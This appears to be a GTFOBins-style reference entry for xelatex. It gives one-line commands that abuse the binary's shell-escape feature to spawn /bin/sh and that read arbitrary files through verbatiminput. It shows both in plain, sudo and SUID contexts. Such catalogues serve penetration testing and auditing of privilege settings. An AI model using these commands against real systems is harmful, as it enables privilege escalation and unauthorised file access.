---
functions:
  shell:
    - code: |
        xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  file-read:
    - description: The read file will be part of the output.
      code: |
        xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        strings article.dvi
  sudo:
    - description: The read file will be part of the output.
      code: |
        sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        strings article.dvi
    - code: |
        sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  limited-suid:
    - code: |
        ./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
---
